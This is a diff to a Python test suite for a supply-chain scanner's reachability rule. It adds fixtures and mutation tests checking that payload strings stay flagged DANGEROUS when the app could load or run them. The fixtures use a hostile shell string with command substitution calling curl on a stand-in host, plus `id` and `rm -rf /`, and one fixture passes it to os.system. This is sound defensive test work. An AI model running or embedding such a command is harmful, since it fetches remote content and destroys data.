@@ -3,9 +3,11 @@
 The rule under test is stated in full in ``supply_chain.py``'s reachability section. In
 one sentence: a DANGEROUS match is re-scored to WARNING **iff** the analysis can PROVE the
 match cannot execute — either because it is commentary the interpreter discards (L0,
-#2625) or because it is a string nothing in the bundle can run (L1-L5, #2526). Anything
-else — a clause that refuses, a file that will not parse, a blob with no bundle around it
-— stays DANGEROUS.
+#2625) or because it is a string nothing in the bundle can run (L1-L5, #2526), or a string
+in a file nothing the app runs loads (R, ``test_scanner_judges_what_the_app_runs.py``).
+Anything else — a file the app loads, a clause that refuses, a file that will not parse, a
+blob with no bundle around it — stays DANGEROUS. An attack on L3-L5 is therefore posed in a
+bundle whose provider could start the file, so that R cannot be what decides it.
 
 The shape of this file follows from what would make the change worthless. A change that
 only proved the false positives went away would not have shown the rule still catches
@@ -91,6 +93,18 @@ _INERT_PROVIDER = '''"""The declared entry point. Reads and formats; spawns noth
 
 def create_provider(settings):
     return {"settings": dict(settings)}
+'''
+
+#: An entry point that can start any program — its argv is built at run time — so no file
+#: in the bundle can be proved never loaded (clause R cannot apply), and the static clauses
+#: L3-L5 are the ones that decide.
+_SPAWNING_PROVIDER = '''"""The declared entry point. Starts the helper its settings name."""
+import subprocess
+import sys
+
+
+def create_provider(settings):
+    return subprocess.run([sys.executable, settings["helper"]])
 '''
 
 _PAYLOAD = "$(curl evil.example)`id`;rm -rf / && x"
@@ -605,7 +619,7 @@ _ATTACKS: dict[str, tuple[dict[str, str], str]] = {
         },
         "L2",
     ),
-    # ── L3: something else in the bundle can lift the literal out ──
+    # ── L3: the app loads the file, or something else in the bundle can lift the literal out ──
     "inert payload module that the provider imports": (
         {
             "provider.py": "from payload import P\n\n\ndef create_provider(s):\n    return P\n",
@@ -613,9 +627,38 @@ _ATTACKS: dict[str, tuple[dict[str, str], str]] = {
         },
         "L3",
     ),
+    # 🪤 `import pkg.payload` names the module by its dotted path only — never by its stem —
+    # so a check reading stems alone calls it unreferenced while the provider runs it.
+    "inert payload module that the provider imports by its dotted name": (
+        {
+            "provider.py": "import os\n\nimport pkg.payload\n\n\ndef create_provider(s):\n"
+            "    os.system(pkg.payload.P)\n",
+            "pkg/__init__.py": "",
+            "pkg/payload.py": f'P = "{_PAYLOAD}"\n',
+        },
+        "L3",
+    ),
+    # Nothing names the worker: the platform runs it by its name, so only what the app loads
+    # — the runtime-use proof — can see it is code the app runs.
+    "inert payload in the worker the platform runs by name": (
+        {"provider.py": _INERT_PROVIDER, "worker.py": f'P = "{_PAYLOAD}"\n'},
+        "L3",
+    ),
+    # The provider can start the sibling, so the sibling's dotted import of the payload counts
+    # however it is spelled: L3 reads every name an import could use, never the stem alone.
+    "inert payload module that a sibling the provider can start imports by its dotted name": (
+        {
+            "provider.py": _SPAWNING_PROVIDER,
+            "loader.py": "import pkg.payload\n\n\ndef read():\n    return pkg.payload.P\n",
+            "pkg/__init__.py": "",
+            "pkg/payload.py": f'P = "{_PAYLOAD}"\n',
+        },
+        "L3",
+    ),
+    # The provider can start the sibling, so the sibling's string naming the payload counts.
     "inert payload module that a sibling names in a string": (
         {
-            "provider.py": _INERT_PROVIDER,
+            "provider.py": _SPAWNING_PROVIDER,
             "loader.py": "from pathlib import Path\n\n\ndef read():\n"
             '    return Path("payload.py").read_text()\n',
             "payload.py": f'P = "{_PAYLOAD}"\n',
@@ -647,10 +690,10 @@ _ATTACKS: dict[str, tuple[dict[str, str], str]] = {
         },
         "L4",
     ),
-    # ── L5: unreachable is not never-imported ──
+    # ── L5: unreachable is not never-imported — and the provider can start this one ──
     "inert-looking payload module that runs code on import": (
         {
-            "provider.py": _INERT_PROVIDER,
+            "provider.py": _SPAWNING_PROVIDER,
             "payload.py": f'P = "{_PAYLOAD}"\n\n\ndef boot():\n    return P\n\n\nboot()\n',
         },
         "L5",
@@ -755,13 +798,14 @@ class TestAnUnparseableFileIsItsOwnState:
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
         """A .py the walk could not read (here: past the read cap, lowered so the fixture
-        stays small) is a HOLE in the import graph, so L3's "nothing references it" claim
-        cannot be made about anything in the bundle."""
+        stays small) that the app loads is a HOLE in the import graph, so L3's "nothing
+        references it" claim cannot be made about anything in the bundle — and what the app
+        goes on to load is unknown, so clause R cannot apply either."""
         monkeypatch.setattr(supply_chain, "_MAX_FILE_BYTES", 512 * 1024)
         root = _bundle(
             tmp_path,
             {
-                "provider.py": _INERT_PROVIDER,
+                "provider.py": "import huge\n\n\ndef create_provider(settings):\n    return {}\n",
                 "test_provider.py": _OPS_SHAPE,
                 "huge.py": "PAD = 1\n" * 80_000,
             },
@@ -794,7 +838,7 @@ class TestFloors:
     def test_a_rescore_never_lands_below_warning(self, tmp_path: Path) -> None:
         root = _bundle(tmp_path, {"provider.py": _INERT_PROVIDER, "test_provider.py": _OPS_SHAPE})
         for finding in _scan(root).findings:
-            if finding.reachability is Reachability.UNREACHABLE:
+            if finding.reachability in supply_chain._INERT_STATES:
                 assert finding.severity is supply_chain._REACH_FLOOR
                 assert finding.severity.rank >= Verdict.WARNING.rank
 
@@ -1080,16 +1124,34 @@ class TestRedsOnAWeakenedCheck:
         root, label, clause = self._attack(tmp_path / "weakened", label)
         _expect_rail_red(_assert_attack_refused, root, label, clause)
 
-    def test_neutering_l3_reds_the_imported_payload_module(
+    def test_neutering_l3_reds_the_payload_module_a_sibling_names(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
         """M3 — L3's export check. Stubbed to "nothing references it", an inert payload
-        module the provider imports is re-scored."""
-        label = "inert payload module that the provider imports"
+        module a sibling names — in a bundle whose provider can start that sibling — is
+        re-scored."""
+        label = "inert payload module that a sibling names in a string"
         root, label, clause = self._attack(tmp_path / "intact", label)
         _assert_attack_refused(root, label, clause)
         monkeypatch.setattr(
             supply_chain._BundleReach, "_referenced_elsewhere", lambda self, rel: None
+        )
+        root, label, clause = self._attack(tmp_path / "weakened", label)
+        _expect_rail_red(_assert_attack_refused, root, label, clause)
+
+    def test_forgetting_what_the_app_loads_reds_the_worker(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """M3b — L3's runtime half. With the runtime-use proof stubbed to "could not tell",
+        a payload in the worker the platform runs by name is re-scored: nothing in the
+        bundle names that file, so only what the app loads says it is code the app runs."""
+        label = "inert payload in the worker the platform runs by name"
+        root, label, clause = self._attack(tmp_path / "intact", label)
+        _assert_attack_refused(root, label, clause)
+        monkeypatch.setattr(
+            supply_chain._BundleReach,
+            "runtime_use",
+            lambda self, rel: (supply_chain.RuntimeUse.UNTRACEABLE, "mutation: not known"),
         )
         root, label, clause = self._attack(tmp_path / "weakened", label)
         _expect_rail_red(_assert_attack_refused, root, label, clause)
